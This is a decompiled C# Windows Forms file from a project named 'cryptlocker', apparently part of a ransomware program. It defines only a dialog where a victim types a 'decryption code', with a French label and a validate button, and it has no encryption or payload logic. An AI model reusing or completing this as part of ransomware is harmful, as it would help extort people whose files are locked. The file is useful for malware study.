using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

namespace cryptlocker;

public class Form2 : Form
{
	private IContainer components = null;

	private TextBox textBox1;

	private Label label1;

	private Button button1;

	public Form2()
	{
		InitializeComponent();
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_0001: Unknown result type (might be due to invalid IL or missing references)
		//IL_000b: Expected O, but got Unknown
		//IL_000c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0016: Expected O, but got Unknown
		//IL_0017: Unknown result type (might be due to invalid IL or missing references)
		//IL_0021: Expected O, but got Unknown
		//IL_00bf: Unknown result type (might be due to invalid IL or missing references)
		//IL_00c9: Expected O, but got Unknown
		textBox1 = new TextBox();
		label1 = new Label();
		button1 = new Button();
		((Control)this).SuspendLayout();
		((Control)textBox1).set_BackColor(Color.FromArgb(37, 37, 37));
		((Control)textBox1).set_Location(new Point(12, 49));
		((TextBoxBase)textBox1).set_Multiline(true);
		((Control)textBox1).set_Name("textBox1");
		((Control)textBox1).set_Size(new Size(309, 60));
		((Control)textBox1).set_TabIndex(0);
		((Control)label1).set_AutoSize(true);
		((Control)label1).set_BackColor(Color.Transparent);
		((Control)label1).set_Font(new Font("Tahoma", 11.25f, (FontStyle)0, (GraphicsUnit)3, (byte)0));
		((Control)label1).set_ForeColor(Color.White);
		((Control)label1).set_Location(new Point(12, 23));
		((Control)label1).set_Name("label1");
		((Control)label1).set_Size(new Size(221, 18));
		((Control)label1).set_TabIndex(1);
		((Control)label1).set_Text("Taper votre code de decryptage");
		((Control)button1).set_Location(new Point(126, 117));
		((Control)button1).set_Name("button1");
		((Control)button1).set_Size(new Size(75, 23));
		((Control)button1).set_TabIndex(2);
		((Control)button1).set_Text("valider");
		((ButtonBase)button1).set_UseVisualStyleBackColor(true);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(Color.FromArgb(51, 51, 51));
		((Form)this).set_ClientSize(new Size(333, 152));
		((Control)this).get_Controls().Add((Control)(object)button1);
		((Control)this).get_Controls().Add((Control)(object)label1);
		((Control)this).get_Controls().Add((Control)(object)textBox1);
		((Control)this).set_Name("Form2");
		((Control)this).set_Text("Form2");
		((Control)this).ResumeLayout(false);
		((Control)this).PerformLayout();
	}
}
